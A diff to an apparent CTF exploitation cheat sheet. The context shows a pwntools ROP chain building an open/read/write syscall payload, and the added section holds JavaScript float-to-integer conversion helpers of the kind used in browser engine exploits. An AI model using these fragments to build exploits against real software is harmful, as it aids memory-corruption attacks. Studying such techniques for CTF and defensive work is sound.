@@ -159,3 +159,24 @@ rdx = rop.find_gadget(['pop rdx','ret'])[0]
 pyaload_open =flat([rax,0x2,rdi,chunk+0xf8,rsi,0,rdx,0,sys])
 pay = pyaload_open+pyaload_rw
 ```
+
+# JavaScript
+```js
+var _b = new ArrayBuffer(16);
+var _f = new Float64Array(_b);
+var _i = new BigUint64Array(_b);
+function f2i(f)
+{
+	_f[0] = f;
+	return _i[0];
+}
+function i2f(i)
+{
+	_i[0] = i;
+	return _f[0];
+}
+function hex(i)
+{
+	return "0x"+i.toString(16).padStart(16,"0");
+}
+```
